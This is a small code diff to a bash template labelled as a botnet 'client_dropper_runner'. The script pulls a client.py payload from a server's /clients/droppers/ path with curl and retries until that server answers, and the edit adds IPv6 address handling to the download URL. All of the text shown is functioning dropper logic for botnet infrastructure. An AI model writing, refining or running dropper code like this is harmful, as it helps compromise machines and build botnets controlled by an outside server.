@@ -22,7 +22,11 @@ BotnetServerFileTemplates['client_dropper_runner'] = '''\
 #!/bin/bash
 url="$3"
 if [ -z "$url" ]; then
-    url="http://$1:$2/clients/droppers/client.py"
+    host="$1"
+    if [[ "$host" == *:* && "${host:0:1}" != "[" ]]; then
+        host="[$host]"
+    fi
+    url="http://$host:$2/clients/droppers/client.py"
 fi
 until curl -sHf "$url" -o client.py > /dev/null; do {
     echo "botnet-client: server $1:$2 not ready, waiting..."
